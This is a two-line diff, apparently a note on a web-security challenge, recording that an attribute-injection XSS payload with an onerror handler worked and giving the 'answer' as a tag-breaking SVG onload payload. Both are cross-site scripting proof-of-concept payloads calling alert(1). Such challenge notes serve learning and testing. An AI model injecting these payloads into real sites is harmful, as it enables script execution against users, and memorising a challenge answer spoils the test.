@@ -1,0 +1,2 @@
+It worked with " onerror=alert(1)" but 
+asnwer is "><svg onload=alert(1)>
